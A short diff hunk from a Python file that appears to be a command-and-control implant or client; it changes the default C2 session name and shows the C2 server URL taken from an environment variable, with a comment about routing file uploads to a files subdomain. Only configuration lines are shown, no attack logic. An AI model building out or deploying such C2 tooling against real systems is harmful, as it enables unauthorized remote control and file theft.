@@ -33,7 +33,7 @@ import threading
 
 # Assume the C2 URL is passed via environment variable (or default to port 443 of VPS)
 C2_SERVER_URL = os.environ.get('C2_SERVER_URL', 'https://lalithadithyan.dev')
-C2_SESSION    = os.environ.get('C2_SESSION', 'default')
+C2_SESSION    = os.environ.get('C2_SESSION', 'DAVA')
 
 # Automatically route file uploads to the optimized files subdomain if C2 is on the main domain
 default_files_url = C2_SERVER_URL
